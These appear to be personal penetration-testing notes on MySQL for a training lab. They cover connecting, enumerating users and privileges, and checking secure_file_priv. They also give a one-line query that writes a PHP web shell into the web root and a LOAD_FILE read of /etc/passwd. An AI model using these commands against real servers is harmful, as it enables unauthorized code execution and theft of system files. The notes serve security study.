## `dbeaver`

```sh
sudo apt install dbeaver
```

>It is a GUI app

## Mysql

### Connect

```sh
mysql -u "$user" "-p$pass" -h $target
```

### Common commands

```mysql
-- Show all db
SHOW DATABASES;
-- Choose a db
USE htbusers;
-- Show tables in selected db
SHOW TABLES;
-- Show all data in a table
SELECT * FROM users;
```

### Check db user

```mysql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

### Write Local Files

#### Check privilege

> To be able to write file, the current db user needs to have `FILE` privilege, and the `secure_file_priv` variable needs to be empty, or specific directory

### Find `FILE` privilege

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges
```

### Find `secure_file_priv` variable

If Null then we can't. Otherwise, empty or specific directory means we can

```mysql
show variables like "secure_file_priv";
```

Alternative way

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

#### Write

```mysql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### Read local file

```mysql
select LOAD_FILE("/etc/passwd");
```

### List dir

```sql
SELECT * FROM sys.dm_os_enumerate_filesystem ('C:\Users','*') WHERE parent_directory = 'C:\Users';
```